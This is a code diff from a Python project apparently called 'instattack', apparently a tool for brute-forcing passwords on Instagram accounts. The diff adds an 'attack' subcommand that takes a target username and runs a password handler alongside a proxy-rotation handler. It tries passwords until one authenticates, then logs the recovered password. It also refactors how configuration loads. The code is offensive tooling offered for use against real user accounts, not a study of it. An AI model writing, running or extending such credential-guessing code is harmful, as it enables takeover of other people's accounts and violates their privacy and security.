@@ -8,7 +8,7 @@ from instattack import logger
 from instattack.conf import Configuration
 from instattack.src.users import User
 
-from .attack import post_handlers, attack
+from .utils import post_handlers
 
 
 class BaseApplication(cli.Application):
@@ -19,12 +19,15 @@ class BaseApplication(cli.Application):
     log = logger.get_sync('Application')
     _config = None
 
+    @classmethod
+    def run(cls, *args, **kwargs):
+        # TODO: Validate just the structure of the configuration object
+        # here, but not the path.
+        cls._config = Configuration.load()
+        return super(BaseApplication, cls).run(*args, **kwargs)
+
     @property
     def config(self):
-        if not self._config:
-            self._config = Configuration.load()
-            # TODO: Validate just the structure of the configuration object
-            # here, but not the path.
         return self._config
 
     async def get_user(self, username):
@@ -66,45 +69,55 @@ class EntryPoint(BaseApplication):
             raise ArgumentTypeError("No command given")
 
 
-class UtilityApplication(BaseApplication):
-
-    @property
-    def config(self):
-        if not self._config:
-            self._config = Configuration.load()
-            # Need to find cleaner way of doing this.
-            self._config.update({'log': {'silent_shutdown': True}})
-            # TODO: Validate just the structure of the configuration object
-            # here, but not the path.
-        return self._config
-
-    def silent_shutdown(self):
-        """
-        If the utility application never accesses config, it will not set the
-        silent shutdown to True.  This is kind of hacky but we will leave for
-        the time being, until we have a better solution to passing config into
-        the CLI.
-        """
-        self.config
-
-
 @EntryPoint.subcommand('attack')
 class BaseAttack(BaseApplication):
 
     __name__ = 'Run Attack'
 
+    # Overrides Password Limit Set in Configuration File
+    limit = cli.SwitchAttr("--limit", int, mandatory=False,
+        help="Limit the number of proxies to collect.")
+
+    collect = cli.Flag("--collect", default=False)
+
     def main(self, username):
+        """
+        Iteratively tries each password for the given user with the provided
+        token until a successful response is achieved for each password or
+        a successful authenticated response is achieved for any password.
+
+        We cannot perform any actions in finally because if we hit an exception,
+        the loop will have been shutdown by that point.
+
+        Proxies will not be saved if it wasn't started, but that is probably
+        desired behavior.
+        """
         loop = asyncio.get_event_loop()
+        if self.limit:
+            self.config.update({'password_limit': self.limit})
+
+        # Default Collect to False
+        self._config.update({'proxies': {'pool': {'collect': self.collect}}})
 
         user = loop.run_until_complete(self.get_user(username))
         if not user:
             return
 
-        result = loop.run_until_complete(self.attempt_attack(loop, user))
-        if result:
-            self.log.info(f'Authenticated User!', extra={
-                'password': result.context.password
-            })
+        proxy_handler, password_handler = post_handlers(user, self.config)
 
-    async def attempt_attack(self, loop, user):
-        return await attack(loop, user, self.config)
+        try:
+            results = loop.run_until_complete(asyncio.gather(
+                password_handler.run(loop),
+                proxy_handler.run(loop)
+            ))
+        except Exception as e:
+            loop.run_until_complete(proxy_handler.stop(loop))
+            loop.call_exception_handler({'exception': e})
+        else:
+            loop.run_until_complete(proxy_handler.stop(loop))
+            result = results[0]
+
+            if result.authorized:
+                self.log.info(f'Authenticated User!', extra={
+                    'password': result.context.password
+                })
